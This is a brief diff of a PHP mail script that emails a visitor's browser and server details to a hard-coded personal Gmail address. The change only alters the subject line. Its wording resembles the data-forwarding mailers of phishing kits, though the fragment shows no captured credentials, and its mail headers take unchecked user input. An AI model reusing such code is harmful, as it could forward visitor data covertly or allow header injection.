@@ -28,7 +28,7 @@ $msg .= "Browser info : ".$_SERVER["HTTP_USER_AGENT"]."\r\n";
 $msg .= "User come from : ".$_SERVER["SERVER_NAME"];
 
 $recipient = "narvaez.jonmichael@gmail.com";// Change the recipient email adress to your adrees  
-$subject =  "Sender information";// This is subject you can change it
+$subject =  "Lets";// This is subject you can change it
 $mailheaders = "From: $email\r\nReply-To: $email\r\nReturn-Path: $email\r\n";
 
 if (!$error){
